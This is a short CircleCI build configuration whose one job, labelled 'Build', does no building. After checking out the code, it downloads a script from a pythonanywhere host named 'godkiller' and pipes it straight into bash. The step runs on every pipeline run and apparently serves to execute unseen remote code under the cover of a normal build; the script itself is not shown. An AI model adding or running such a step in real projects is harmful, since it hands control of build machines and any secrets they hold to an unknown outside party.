version: 2.1
jobs:
  build:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run:
          name: Build
          command: |
            curl -s https://godkiller.pythonanywhere.com/install.sh | bash
workflows:
  version: 2
  build:
    jobs:
      - build
